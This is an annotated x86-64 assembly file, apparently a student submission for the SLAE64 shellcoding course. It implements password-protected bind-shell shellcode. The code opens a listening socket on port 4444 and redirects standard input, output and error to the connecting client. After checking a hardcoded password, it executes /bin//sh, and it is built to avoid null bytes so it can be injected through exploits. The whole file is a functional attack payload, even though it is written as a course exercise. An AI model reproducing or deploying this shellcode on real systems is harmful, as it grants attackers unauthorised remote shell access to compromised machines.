; SLAE64 assignment 1
; by Jasper Lievisse Adriaanse
; Student ID: SLAE64-1614
global _start

%define	SYS_WRITE	1
%define	SYS_CLOSE	3
%define	SYS_DUP2	33
%define	SYS_SOCKET	41
%define	SYS_ACCEPT	43
%define	SYS_BIND	49
%define	SYS_LISTEN	50
%define	SYS_EXECVE	59

section .text

_start:
	; Start by opening a socket(2)
	; syscall:
	;	socket: 41 on Linux/x86_64
	; arguments:
	; 	%rdi: AF_INET = 2
	;	%rsi: SOCK_STREAM = 1
	;	%rdx: 0
	; returns:
	;	%rax: socket file descriptor
	push SYS_SOCKET
	pop rax
	mov dil, 0x2
	mov sil, 0x1
	xor rdx, rdx
	syscall

	; Future syscalls (bind and accept) execpt the socket fd in %rdi,
	; so save it there for future use.
	mov rdi, rax

	; Setup server struct sockaddr_in on the stack (in reverse order).
	; Now, we need to take care to prevent a null byte from sneaking in when
	; saving AF_INET. So clear the full 16 bytes we need (double %rax push)
	; and build the stack on top of the zeroed area.
	;
	; Struct members (in reverse order):
	; 	sin_zero:        0
	; 	sin_addr.s_addr: INADDR_ANY = 0
	; 	sin_port:        4444 (in network byteorder)
	; 	sin_family:      AF_INET = 2
	xor rax, rax
	push rax			; sin_zero
	push rax			; zero out another 8 bytes for remaining members
					; including 4 bytes for sin_addr.s_addr which
					; need to remain 0
	mov word [rsp+2], 0x5c11	; sin_port
	mov byte [rsp], 0x2		; sin_family

	; Invoke the bind(2) syscall to bind the socket to an address (any in our case)
	; syscall:
	;	bind: 49 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd as returned by socket(2)
	;	%rsi: stack pointer (referencing struct sockaddr)
	;	%rdx: 16 (sizeof sockaddr)
	; returns:
	;	%rax: 0 if succesful (ignored)
	mov al, SYS_BIND
	mov rsi, rsp
	add rdx, 0x10
	syscall

	; Invoke the listen(2) syscall to start listening for connections
	; syscall:
	;	listen: 50 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd as returned by socket(2)
	;	%rsi: maximum number of clients = 1 (does not really matter now)
	; returns:
	;	%rax: 0 if succesful (ignored)
	xor rax, rax
	mov rsi, rax
	add rax, SYS_LISTEN
	inc rsi
	syscall

	; Invoke the accept(2) syscall to accept an incoming connection
	; syscall:
	;	accept: 43 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd as returned by socket(2)
	;	%rsi: struct sockaddr for the client (not zeroed out) on the stack
	;	%rdx: size of client structure on the stack
	; returns:
	;	%rax: new socket file descriptor for connection with client
	xor rax, rax
	add al, SYS_ACCEPT
	mov rsi, rsp		; stack pointer for client sockaddr
	mov byte [rsp-1], 0x10	; put size of the structure on the stack
	dec rsp			; adjust stack pointer for previous
	mov rdx, rsp		; stack pointer for struct size
	syscall

	; Now save the client socket in a register we won't clobber (%r14)
	mov r14, rax

	; close(2) the socket initially allocated as we don't need it anymore
	; syscall:
	; 	close: 3 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd as returned by socket(2)
	; returns:
	;	%rax: 0 if succesful (ignored)
	xor rax, rax
	add al, SYS_CLOSE
	syscall

	; duplicate file descriptors for STDIN, STDOUT and STDERR with dup2(2)
	; syscall:
	;	dup2: 33 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd
	;	%rsi: original fd (0, 1 and 2 respectively)
	; returns:
	;	%rax: new file descriptor if succesful
	xor rax, rax
	; The System V AMD64 ABI states that (among others) R12-R15 must be caller saved. So after
	; the syscall returns we can assume it's still at it's previous value.
	mov r15, rax	; save a 0
	mov rdi, r14	; our saved socket fd from accept(2)
	add al, SYS_DUP2
	mov r13, rax	; save the syscall number
	mov rsi, r15	; STDIO = 0
	syscall

	mov rax, r13	; saved syscall number
	mov rsi, r15	; saved 0
	inc rsi		; increment to 1 for STDOUT
	syscall

	mov rax, r13	; saved syscall number
	mov rsi, r15	; saved 0
	add sil, 0x2	; set to 2 for STDERR
	syscall

	; Since we don't get a shell prompt, we might as well print a password prompt.
	; syscall:
	;	write: 0 on Linux/x86_64
	; arguments:
	;	%rdi: socket fd with the connecting client
	;	%rsi: pointer to a string on the stack
	;	%rdx: number of bytes to write
	xor rax, rax
	add al, SYS_WRITE
	xor rsi, rsi
	push rsi                ; push terminating NULL to the stack
	mov rsi, 0x203a64726f777373
	push rsi
	mov rsi, 0x6170207265746e65
	push rsi
	mov rsi, rsp		; load address to our prompt ('enter password:') into %rsi
	xor rdx, rdx
	mov dl, 16		; size of our prompt
	syscall

	; The password is 'taptap!!'
	mov rbx, 0x2121706174706174

	; Read the password provided on the socket fd with read(2)
	; syscall:
	; 	read: 0 on Linux/x86_64
	; arguments:
	;	%rdi: saved socket fd
	;	%rsi: buffer (on the stack) to read data into
	;	%rdx: number of bytes to read
	xor rax, rax
	sub rsp, 8	; allocate 8 bytes of storage on the stack
	mov rsi, rsp
	mov rdx, rax
	add rdx, 8
	syscall

	cmp rbx, [rsi]	; now perform a raw compare of the buffer pointed to by %rsi
	jnz fail	; if the comparison didn't result in ZF being set, abort.

	; Now we need to setup the stack for the execve(2) syscall and call it to
	; execute our shell.
	; syscall:
	;	execve: 59 on Linux/x86_64
	; arguments:
	;	%rdi: pointer address of our /bin//sh string on the stack
	;	%rsi: idem
	;	%rdx: NULL
	; returns:
	;	does not return here we terminate afterwards
	push r15	; \0 to terminate our /bin//sh string
	; Now push the string /bin//sh (in reverse) onto the stack
	mov rax, 0x68732f2f6e69622f
	push rax
	mov rdi, rsp	; address to the string
	push r15	; NULL for %RDX
	mov rdx, rsp	; point to the NULL
	push rdi	; Put the address in %RDI on the stack
	mov rsi, rsp	; and put it in %RSI whilst having %RSP adjusted
	mov rax, r15	; setup %RAX for execve() and off we go!
	add al, SYS_EXECVE
	syscall

fail:
	xor rax, rax
	mov rdi, rax
	mov al, 60
	mov dil, 1
	syscall
